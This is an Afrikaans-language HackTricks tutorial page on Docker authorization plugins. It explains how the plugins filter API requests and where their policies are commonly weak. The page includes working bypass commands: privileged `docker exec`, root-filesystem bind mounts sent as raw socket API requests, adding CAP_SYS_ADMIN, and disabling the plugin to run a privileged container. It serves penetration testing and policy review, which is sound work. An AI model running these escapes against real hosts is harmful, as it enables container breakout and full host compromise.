# Runtime-magtigingsplugins

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Runtime-magtigingsplugins is ’n ekstra beleidslaag wat bepaal of ’n oproeper ’n gegewe daemon-aksie mag uitvoer. Docker is die klassieke voorbeeld. By verstek het enigiemand wat met die Docker daemon kan kommunikeer, effektief uitgebreide beheer daaroor. Authorization plugins probeer hierdie model te beperk deur die geverifieerde gebruiker en die aangevraagde API-operasie te ondersoek, en dan die versoek volgens beleid toe te laat of te weier.

Hierdie onderwerp verdien sy eie bladsy omdat dit die exploitation-model verander wanneer ’n attacker reeds toegang tot ’n Docker API of tot ’n gebruiker in die `docker`-groep het. In sulke omgewings is die vraag nie meer net "kan ek die daemon bereik?" nie, maar ook "word die daemon deur ’n authorization-laag afgesper, en indien wel, kan daardie laag deur onhanteerde endpoints, swak JSON-parsing of plugin-management-permissies omseil word?"

## Werking

Wanneer ’n versoek die Docker daemon bereik, kan die authorization-substelsel die versoekkonteks aan een of meer geïnstalleerde plugins deurgee. Die plugin sien die geverifieerde gebruiker se identiteit, die versoekbesonderhede, geselekteerde headers en dele van die versoek- of response-body wanneer die content type geskik is. Veelvuldige plugins kan geketting word, en toegang word slegs toegestaan indien alle plugins die versoek toelaat.

Hierdie model klink sterk, maar die veiligheid daarvan hang volledig af van hoe volledig die beleidsskrywer die API verstaan het. ’n Plugin wat `docker run --privileged` blokkeer maar `docker exec` ignoreer, alternatiewe JSON-sleutels soos top-level `Binds` mis, of plugin-administrasie toelaat, kan ’n vals gevoel van beperking skep terwyl dit steeds direkte privilege-escalation-paaie ooplaat.

## Algemene Plugin-teikens

Belangrike areas vir beleidshersiening is:

- container creation endpoints
- `HostConfig`-velde soos `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` en namespace-sharing-opsies
- `docker exec`-gedrag
- plugin-management-endpoints
- enige endpoint wat runtime-aksies buite die beoogde beleidsmodel indirek kan aktiveer

Histories het voorbeelde soos Twistlock se `authz`-plugin en eenvoudige educational plugins soos `authobot` hierdie model maklik gemaak om te bestudeer, omdat hul beleidslêers en code paths gewys het hoe endpoint-tot-aksie-kartering werklik geïmplementeer is. Vir assessment-werk is die belangrike les dat die beleidsskrywer die volledige API-oppervlak moet verstaan, eerder as net die CLI commands wat die sigbaarste is.

## Abuse

Die eerste doel is om vas te stel wat werklik geblokkeer word. Indien die daemon ’n aksie weier, lek die fout dikwels die plugin-naam, wat help om die beheer wat gebruik word, te identifiseer:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
As jy breër endpoint-profilering benodig, is tools soos `docker_auth_profiler` nuttig omdat hulle die andersins herhalende taak outomatiseer om te kontroleer watter API-roetes en JSON-strukture werklik deur die plugin toegelaat word.

As die omgewing ’n custom plugin gebruik en jy met die API kan interaksie hê, enumereer watter objekvelde werklik gefiltreer word:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Hierdie kontroles is belangrik omdat baie magtigingsfoute veldspesifiek eerder as konsep-spesifiek is. ’n Plugin kan ’n CLI-patroon weier sonder om die ekwivalente API-struktuur volledig te blokkeer.

### Volledige voorbeeld: `docker exec` voeg privilege by ná container-skepping

’n Beleid wat die skep van privileged containers blokkeer, maar die skep van unconfined containers plus `docker exec` toelaat, kan steeds omseil word:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
As die daemon die tweede stap aanvaar, het die gebruiker ’n gepriviligeerde interaktiewe proses binne ’n container herwin wat die beleidsskrywer geglo het beperk was.

### Volledige voorbeeld: Bind Mount Through Raw API

Sommige gebrekkige policies inspekteer slegs een JSON-vorm. As die bind mount van die root filesystem nie konsekwent geblokkeer word nie, kan die host steeds gemount word:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Dieselfde idee kan ook onder `HostConfig` voorkom:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Die impak is ’n volledige ontsnapping uit die gasheer se lêerstelsel. Die interessante detail is dat die bypass voortspruit uit onvolledige beleidsdekking eerder as uit ’n kernel bug.

### Volledige voorbeeld: Ongekontroleerde Capability-kenmerk

As die beleid vergeet om ’n capability-verwante kenmerk te filter, kan die aanvaller ’n container skep wat ’n gevaarlike capability terugkry:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Sodra `CAP_SYS_ADMIN` of ’n soortgelyke sterk capability teenwoordig is, word baie breakout techniques wat in [capabilities.md](protections/capabilities.md) en [privileged-containers.md](privileged-containers.md) beskryf word, bereikbaar.

### Volledige voorbeeld: Deaktivering van die Plugin

As plugin-management operations toegelaat word, kan die netjiesste bypass wees om die beheer heeltemal af te skakel:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Dit is ’n beleidsmislukking op die control-plane-vlak. Die magtigingslaag bestaan, maar die gebruiker wat dit moes beperk, behou steeds toestemming om dit te deaktiveer.

## Kontroles

Hierdie opdragte is daarop gemik om vas te stel of ’n beleidslaag bestaan en of dit volledig of oppervlakkig blyk te wees.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Wat hier interessant is:

- Denial-boodskappe wat ’n plugin-naam insluit, bevestig ’n magtigingslaag en onthul dikwels die presiese implementering.
- ’n Plugin-lys wat vir die aanvaller sigbaar is, kan genoeg wees om te ontdek of disable- of reconfigure-bewerkings moontlik is.
- ’n Policy wat slegs ooglopende CLI-aksies blokkeer, maar nie rou API-versoeke nie, moet as omseilbaar beskou word totdat die teendeel bewys is.

## Runtime-verstekwaardes

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Nie by verstek geaktiveer nie | Toegang tot die daemon is effektief alles-of-niks, tensy ’n authorization plugin gekonfigureer is | onvolledige plugin-policy, blacklists in plaas van allowlists, die toelaat van plugin-bestuur, blindekolle op veldvlak |
| Podman | Nie ’n algemene direkte ekwivalent nie | Podman maak tipies meer staat op Unix-permissies, rootless-uitvoering en besluite oor API-blootstelling as op Docker-styl authz-plugins | om ’n rootful Podman-API breed bloot te stel, swak socket-permissies |
| containerd / CRI-O | Verskillende beheermodel | Hierdie runtimes maak gewoonlik staat op socket-permissies, node-trust boundaries en hoërvlak-orchestrator-kontroles eerder as Docker authz-plugins | om die socket in workloads te mount, swak node-local trust-aannames |
| Kubernetes | Gebruik authn/authz op die API-server- en kubelet-vlakke, nie Docker authz-plugins nie | Cluster RBAC en admission-kontroles is die hoof-policylaag | oormatige RBAC, swak admission-policy, om kubelet- of runtime-API’s direk bloot te stel |
{{#include ../../../banners/hacktricks-training.md}}
